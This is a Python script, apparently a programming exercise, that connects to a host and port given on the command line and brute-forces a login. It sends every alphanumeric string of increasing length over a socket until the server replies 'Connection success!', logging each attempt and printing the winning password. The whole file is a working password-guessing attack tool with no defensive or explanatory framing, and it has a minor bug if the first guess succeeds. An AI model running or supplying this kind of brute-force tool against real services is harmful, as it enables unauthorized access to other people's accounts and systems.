import socket
import sys
import logging
import itertools

logging.basicConfig(level=logging.DEBUG, filename='log.log')

def password_generator():
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    i = 1
    while True:
        password = itertools.product(chars, repeat=i)
        i += 1
        for elem in password:
            yield ''.join(elem)

def main():
    args = sys.argv
    with socket.socket() as client_socket:
        hostname = args[1]
        port = int(args[2])
        address = (hostname, port)
        client_socket.connect(address)

        password = password_generator()
        client_socket.send(next(password).encode())

        response = client_socket.recv(1024).decode()
        while response != "Connection success!":
            pw = next(password)
            client_socket.send(pw.encode())
            response = client_socket.recv(1024).decode()
            logging.debug(response + ', ' + pw)
        print(pw)

main()
